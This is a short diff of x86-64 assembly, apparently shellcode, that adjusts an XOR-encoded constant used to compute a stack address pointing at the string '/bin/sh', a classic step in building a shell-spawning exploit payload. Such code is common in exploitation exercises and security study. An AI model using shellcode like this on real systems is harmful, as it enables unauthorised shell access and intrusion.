@@ -14,7 +14,7 @@ main:
         shl     $32, %rcx
 
         xor     %rax, %rax
-        xor     $0xffffe910, %eax
+        xor     $0xffffe949, %eax
         xor     %rax, %rcx              /* %rcx=0x00007fffffffdf50 (ptr to str  "/bin/sh") */
 
         xor     %rax, %rax
